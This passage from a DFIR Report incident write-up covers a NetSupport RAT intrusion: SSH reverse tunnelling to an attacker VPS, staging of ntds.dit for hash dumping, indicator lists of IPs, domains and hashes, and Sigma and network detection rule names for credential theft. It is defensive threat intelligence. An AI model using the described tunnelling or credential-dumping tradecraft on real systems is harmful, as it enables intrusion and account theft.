<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-042.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22634" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-042.png" alt width="858" height="511" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-042.png 858w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-042-300x179.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-042-768x457.png 768w" sizes="(max-width: 858px) 100vw, 858px" /></a></p>
<h3 class="wp-block-heading">SSH Tunnelling</h3>
<p>On day five of this intrusion, two scheduled tasks (&#8220;SSH Server&#8221; and &#8220;SSH Key Exchange&#8221;) were created on the beachhead to establish a local SSH server running on port 2222 for remote system 185.206.146.129.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-043.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22635" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-043.png" alt width="1507" height="300" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-043.png 1507w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-043-300x60.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-043-1024x204.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-043-768x153.png 768w" sizes="(max-width: 1507px) 100vw, 1507px" /></a></p>
<figure class="wp-block-image"></figure>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-044.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22636" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-044.png" alt width="3599" height="584" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-044.png 3599w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-044-300x49.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-044-1024x166.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-044-768x125.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-044-1536x249.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-044-2048x332.png 2048w" sizes="(max-width: 3599px) 100vw, 3599px" /></a></p>
<p>The command used to establish the reverse SSH tunnel within the scheduled task is described below:</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-045.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22637" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-045.png" alt width="2868" height="1723" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-045.png 2868w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-045-300x180.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-045-1024x615.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-045-768x461.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-045-1536x923.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-045-2048x1230.png 2048w" sizes="(max-width: 2868px) 100vw, 2868px" /></a></figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"> </div>
</figure>
<p>Below diagram depicts this SSH reverse tunnel from the victim network to attacker&#8217;s VPS.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-046.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22638" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-046.png" alt width="1302" height="430" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-046.png 1302w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-046-300x99.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-046-1024x338.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-046-768x254.png 768w" sizes="(max-width: 1302px) 100vw, 1302px" /></a></p>
<h2 class="wp-block-heading" id="exfiltration"><a href="#exfiltration">Exfiltration</a></h2>
<p>During the intrusion, we noticed that the threat actors staging data of interest.  It is likely that the threat actor exfiltrated the data over the encrypted C2 channel; however, we observed no evidence of this activity.  The <em>ntds.dit</em> can be used to dump hashes from the Active Directory, which can then be cracked using a tool like Hashcat. The file <em>mf.txt </em>contained all dumped events with event id 4624. This could be analyzed offline to determine possible interesting accounts without actively querying the Active Directory. No specific exfiltration actions were observed, so anything taken was likely moved over existing command and control channels. The threat actor also appeared to be interested in some documents, but we only observed opening of those files, not any exfiltration attempts.</p>
<h2 id="impact" class="wp-block-heading"><a href="#impact">Impact</a></h2>
<p>The threat actors were evicted from the network before any further impact occurred.</p>
<h2 id="timeline" class="wp-block-heading"><a href="#timeline">Timeline</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-047-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22688" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-047-1.png" alt width="3972" height="7416" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-047-1.png 3972w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-047-1-161x300.png 161w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-047-1-548x1024.png 548w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-047-1-768x1434.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-047-1-823x1536.png 823w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-047-1-1097x2048.png 1097w" sizes="(max-width: 3972px) 100vw, 3972px" /></a></p>
<p>&nbsp;</p>
<h2 id="indicators" class="wp-block-heading"><a href="#indicators">Indicators</a></h2>
<h3 class="wp-block-heading">Atomic</h3>
<pre>1otal[.]com
79.137.202.132
185.206.146.129
npinmclaugh11[.]com
npinmclaugh14[.]com
89.185.85.44
wsus-isv-local[.]tech
79.137.206.37
wsus-isv-internal[.]tech
</pre>
<h3 class="wp-block-heading">Computed</h3>
<pre>2326.js
72dc8b8b6c7c083128728b8405fa5a8f  
9060c11e7d18d7047ad81aa4241187eebd93c0da  
b1f52abc28427c5a42a70db9a77163dde648348e715f59e8a335c7252ae4a032  

NSM.LIC
e9609072de9c29dc1963be208948ba44  
03bbe27d0d1ba651ff43363587d3d6d2e170060f  
dc6a52ad6d637eb407cc060e98dfeedcca1167e7f62688fb1c18580dd1d05747  

NSM.ini
88b1dab8f4fd1ae879685995c90bd902  
3d23fb4036dc17fa4bee27e3e2a56ff49beed59d 
60fe386112ad51f40a1ee9e1b15eca802ced174d7055341c491dee06780b3f92   

PingCastle.exe
ecb98b7b4d4427eb8221381154ff4cb2  PingCastle.exe
72dbb719b05f89d9d2dbdf186714caf7639daa36  
768021fc242054decc280675750dec0a9e74e764b8646864c58756fa2386d2a2  

client32.ini
729711d44606095a4727aed7ff4d864d  
8af9952f5e0fa84606f588c5704c5a5ab7e06822  
bba34ad7183d7911f7f2c53bfe912d315d0e44d7aa0572963dc003d063130e85  

client32u.ini
7ba6ead2477bd9956886086f69552ac6  
3a8c2155f9b97e06f3d9990387492ef0260f6209  
aa92645428fb4c4e2cccbdf9b6acd7e6a51eecc2d6d63d7b8fe2e119e93c2bb5  

install.bat
b0f3b2741a50a3608f5c7f898d14c571  
3021194d590f5dfb32fb24c7d0e359c4db2f9178  
041b0504742449c7c23750490b73bc71e5c726ad7878d05a73439bd29c7d1d19  

mswow86.exe
c60ac6a6e6e582ab0ecb1fdbd607705b  
ba9de479beb82fd97bbdfbc04ef22e08224724ba  
4d24b359176389301c14a92607b5c26b8490c41e7e3a2abbc87510d1376f4a87  

netscan32.exe
d1212fb5c6333c218f62f3f83341539c  
19be503233f0eda426a418addc82edecf223af9d  
097f2a0e032bf20757e004e80c9a2640f41b8514e32d42004632de7c721b015f  

netscan64.exe
b30025427a546c23b122eea43171ef21  
f85c2447003221f59c9f0fa6654464ac78015be3  
5ef9844903e8d596ac03cc000b69bbbe45249eea02d9678b38c07f49e4c1ec46  

nskbfltr.inf
26e28c01461f7e65c402bdf09923d435  
1d9b5cfcc30436112a7e31d5e4624f52e845c573  
d96856cd944a9f1587907cacef974c0248b7f4210f1689c1e6bcac5fed289368  

nsm_vpro.ini
3be27483fdcdbf9ebae93234785235e3  
360b61fe19cdc1afb2b34d8c25d8b88a4c843a82  
4bfa4c00414660ba44bddde5216a7f28aeccaa9e2d42df4bbff66db57c60522b  

ntds.bat
ab828b585b4c2ce90171e5e0b13aaa55  
5454d444aeefda5fb251b081218082ec858b94d3  
060e9ff09cd97ec6a1b614dcc1de50f4d669154f59d78df36e2c4972c2535714  

remcmdstub.exe
6fca49b85aa38ee016e39e14b9f9d6d9  
b0d689c70e91d5600ccc2a4e533ff89bf4ca388b  
fedd609a16c717db9bea3072bed41e79b564c4bc97f959208bfa52fb3c9fa814  

start.bat
2736d3a1aa9cba6fa61db380d4bdf447  
2848dc0e665eb1b2508b75b4375c6937ab9a4968  
4c0736c9a19c2e172bb504556f7006fa547093b79a0a7e170e6412f98137e7cd  
B

pth_addadmin.exe
4b0f482757876a3e07b94d2390d9906c  
141cd13c6fe9cf00d513b8e4cbc9b94b3ca9f4b3  
3bee705c062227dcb2d109bf62ab043c68ba3fb53b1ce679dc138273ba884b08  

pth_createuser.exe
a02d89b0210671b3519c5d3818188e53  
ad58d012e2bacc87f348e72e1377cf35bc6c9ebd  
e42620721f5ec455a63cded483d18dfa5abdabca3319b0a4e3e21bd098348d48
</pre>
<h2 id="detections" class="wp-block-heading"><a href="#detections">Detections</a></h2>
<h3 class="wp-block-heading">Network</h3>
<pre>ET INFO NetSupport Remote Admin Checkin
ET INFO NetSupport Remote Admin Response
ET MALWARE NetSupport RAT with System Information
ET POLICY NetSupport GeoLocation Lookup Request
ET USER_AGENTS WinRM User Agent Detected - Possible Lateral Movement
ET POLICY WinRM wsman Access - Possible Lateral Movement
ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection
ET SCAN Behavioral Unusual Port 1433 traffic Potential Scan or Infection
</pre>
<h3 class="wp-block-heading">Sigma</h3>
<p> Search sigma rules at <a href="https://detection.fyi/" target="_blank" rel="noreferrer noopener">detection.fyi</a></p>
<p>Sigma Repo:</p>
<pre>0afbd410-de03-4078-8491-f132303cb67d - Renamed NetSupport RAT Execution
2afafd61-6aae-4df4-baed-139fa1f4c345 - Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)
8bc64091-6875-4881-aaf9-7bd25b5dda08 - Suspicious Process Patterns NTDS.DIT Exfil
0b8baa3f-575c-46ee-8715-d6f28cc7d33c - NTDS.DIT Created
9f107a84-532c-41af-b005-8d12a607639f - Suspicious Cabinet File Expansion
058f4380-962d-40a5-afce-50207d36d7e2 - HackTool - CrackMapExec Execution Patterns
0ef56343-059e-4cb6-adc1-4c3c967c5e46 - Suspicious Execution of Systeminfo
4a0b2c7e-7cb2-495d-8b63-5f268e7bfd67 - Renamed ProcDump Execution
17769c90-230e-488b-a463-e05c08e9d48f - Powershell Defender Exclusion
1ec65a5f-9473-4f12-97da-622044d6df21 - Powershell Defender Disable Scan Feature
ad720b90-25ad-43ff-9b5e-5c841facc8e5 - Add User to Local Administrators Group
ffa28e60-bdb1-46e0-9f82-05f7a61cc06e - Suspicious Add User to Remote Desktop Users Group
1e33157c-53b1-41ad-bbcc-780b80b58288 - WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript
cd5cfd80-aa5f-44c0-9c20-108c4ae12e3c - New Firewall Rule Added Via Netsh.EXE
ca2092a1-c273-4878-9b4b-0d60115bf5ea - Suspicious Encoded PowerShell Command Line
07f8bdc2-c9b3-472a-9817-5a670b872f53 - Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE
b1ec66c6-f4d1-4b5c-96dd-af28ccae7727 - New Generic Credentials Added Via Cmdkey.EXE
502b42de-4306-40b4-9596-6f590c81f073 - Local Accounts Discovery
</pre>
<p>Joe Security:</p>
<pre>200105 - Powershell drops NetSupport RAT client</pre>
<p>The DFIR Report Repo:</p>
<pre>a5661068-c85f-4ee1-bc13-6b753bd2c7b7 - Adding, Listing and Removing Credentials via Cmdkey CommandLine Ultility<br/>d938de18-7f57-4c9c-93b9-a621c746d594 - NIM Pass The Hash Tooling Detection</pre>
<h3 class="wp-block-heading">Yara</h3>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/19438/19438.yar">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/19438/19438.yar</a></div>
<div> </div>
</figure>
<h2 id="diamond-model" class="wp-block-heading"><a href="#diamond-model">Diamond Model</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-048.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22640" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-048.png" alt width="4040" height="1708" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-048.png 4040w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-048-300x127.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-048-1024x433.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-048-768x325.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-048-1536x649.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-048-2048x866.png 2048w" sizes="(max-width: 4040px) 100vw, 4040px" /></a></p>
<h2 id="mitre" class="wp-block-heading"><a href="#mitre">MITRE</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/10/19348-049-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-22689" src="https://thedfirreport.com/wp-content/uploads/2023/10/19348-049-1.png" alt width="2512" height="2390" srcset="https://thedfirreport.com/wp-content/uploads/2023/10/19348-049-1.png 2512w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-049-1-300x285.png 300w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-049-1-1024x974.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-049-1-768x731.png 768w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-049-1-1536x1461.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/10/19348-049-1-2048x1949.png 2048w" sizes="(max-width: 2512px) 100vw, 2512px" /></a></p>
<p>&nbsp;</p>
<pre>Proxy - T1090
Uncommonly Used Port - T1065
JavaScript - T1059.007
Windows Command Shell - T1059.003
PowerShell - T1059.001
Registry Run Keys / Startup Folder - T1547.001
Scheduled Task - T1053.005
Local Account - T1136.001
Disable or Modify Tools - T1562.001
NTDS - T1003.003
LSASS Memory - T1003.001
Protocol Tunneling - T1572
Windows Management Instrumentation - T1047
Remote Desktop Protocol - T1021.001
System Owner/User Discovery - T1033
Domain Groups - T1069.002
Remote System Discovery - T1018
System Information Discovery - T1082
Process Discovery - T1057
Domain Account - T1087.002
Local Account - T1087.001
Archive via Utility - T1560.001
Obfuscated Files or Information - T1027
Deobfuscate/Decode Files or Information - T1140
Masquerade Task or Service - T1036.004
SMB/Windows Admin Shares - T1021.002
Lateral Tool Transfer - T1570
Malicious File - T1204.002
Domain Trust Discovery - T1482
Group Policy Discovery - T1615 </pre>
<p>Internal case #19438</p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-22587" class="share-twitter sd-button share-icon" href="https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/?share=twitter" target="_blank" title="Click to share on Twitter"><span>Twitter</span></a></li><li class="share-linkedin"><a rel="nofollow noopener noreferrer" data-shared="sharing-linkedin-22587" class="share-linkedin sd-button share-icon" href="https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/?share=linkedin" target="_blank" title="Click to share on LinkedIn"><span>LinkedIn</span></a></li><li class="share-reddit"><a rel="nofollow noopener noreferrer" data-shared class="share-reddit sd-button share-icon" href="https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/?share=reddit" target="_blank" title="Click to share on Reddit"><span>Reddit</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-22587" class="share-facebook sd-button share-icon" href="https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/?share=facebook" target="_blank" title="Click to share on Facebook"><span>Facebook</span></a></li><li class="share-jetpack-whatsapp"><a rel="nofollow noopener noreferrer" data-shared class="share-jetpack-whatsapp sd-button share-icon" href="https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/?share=jetpack-whatsapp" target="_blank" title="Click to share on WhatsApp"><span>WhatsApp</span></a></li><li class="share-end"></li></ul></div></div></div>
<div id="jp-relatedposts" class="jp-relatedposts">
<h3 class="jp-relatedposts-headline"><em>Related</em></h3>
</div>
</div>
<footer class="entry-footer">
<div class="entry-meta">
</div>
</footer>
</div>
</article>
<nav class="navigation post-navigation" aria-label="Posts">
<h2 class="screen-reader-text">Post navigation</h2>
<div class="nav-links"><div class="nav-previous"><a href="https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/" rel="prev">From ScreenConnect to Hive Ransomware in 61 hours</a></div><div class="nav-next"><a href="https://thedfirreport.com/2023/12/04/sql-brute-force-leads-to-bluesky-ransomware/" rel="next">SQL Brute Force Leads to BlueSky Ransomware</a></div></div>
</nav>
</main>
</div>
<aside id="secondary" class="widget-area">
<section id="search-4" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://thedfirreport.com/">
<label>
<span class="screen-reader-text">Search for:</span>
<input type="search" class="search-field" placeholder="Search &hellip;" value name="s" />
</label>
<input type="submit" class="search-submit" value="Search" />
</form></section><section id="google_translate_widget-5" class="widget widget_google_translate_widget"><div id="google_translate_element"></div></section><section id="block-7" class="widget widget_block"> <div class="wp-block-jetpack-subscriptions__supports-newline wp-block-jetpack-subscriptions">
<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
<form action="https://wordpress.com/email-subscriptions" method="post" accept-charset="utf-8" data-blog="175340963" data-post_access_level="everybody" data-subscriber_email id="subscribe-blog">
<div class="wp-block-jetpack-subscriptions__form-elements">
<p id="subscribe-email">
<label id="subscribe-field-label" for="subscribe-field" class="screen-reader-text">
Type your email… </label>
<input required="required" type="email" name="email" class="no-border-radius " style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 0px;border-width: 1px;" placeholder="Type your email…" value id="subscribe-field" title="Please fill in this field." /> </p>
<p id="subscribe-submit">
<input type="hidden" name="action" value="subscribe" />
<input type="hidden" name="blog_id" value="175340963" />
<input type="hidden" name="source" value="https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/" />
<input type="hidden" name="sub-type" value="subscribe-block" />
<input type="hidden" name="app_source" value />
<input type="hidden" name="redirect_fragment" value="subscribe-blog" />
<input type="hidden" name="lang" value="en_US" />
<input type="hidden" id="_wpnonce" name="_wpnonce" value="2bedf18890" /><input type="hidden" name="_wp_http_referer" value="/2023/10/30/netsupport-intrusion-results-in-domain-compromise/" /><input type="hidden" name="post_id" value="22587" /> <button type="submit" class="wp-block-button__link no-border-radius" style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 0px;border-width: 1px;" name="jetpack_subscriptions_widget">
Subscribe </button>
</p>
</div>
</form>
</div>
</div>
</section><section id="block-21" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png" alt class="wp-image-35571 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1.png 200w, https://thedfirreport.com/wp-content/uploads/2024/06/ctf-1-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h4 class="wp-block-heading"><a href="https://the-dfir-report-store.myshopify.com/products/dfir-labs-ctf-july-6-16-00-20-00-utc">Register For Our Next CTF</a></h4>
</div></div>
</section><section id="block-8" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png" alt class="wp-image-21332 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/monitor5-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/" data-type="link" data-id="https://thedfirreport.com/">Reports</a></h3>
</div></div>
</section><section id="block-9" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/threat-intelligence/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png" alt class="wp-image-21334 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/cloud4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></h3>
</div></div>
</section><section id="block-10" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/detection-rules/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png" alt class="wp-image-21336 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/warning4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></h3>
</div></div>
</section><section id="block-16" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="(max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside>
</div>
</div>
</div>
<footer id="colophon" class="site-footer" role="contentinfo">
<div class="copyright-area">
<div class="wrap">
<div class="site-info">
<a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved </div>
<div class="footer-right-info">
</div>
</div>
</div>
</footer>
<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
</div>
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="2d56ff63091f999082d29cc6-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2023\/10\/30\/netsupport-intrusion-results-in-domain-compromise\/":22587};
	</script>
<style id="jetpack-block-subscriptions-inline-css" type="text/css">
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email 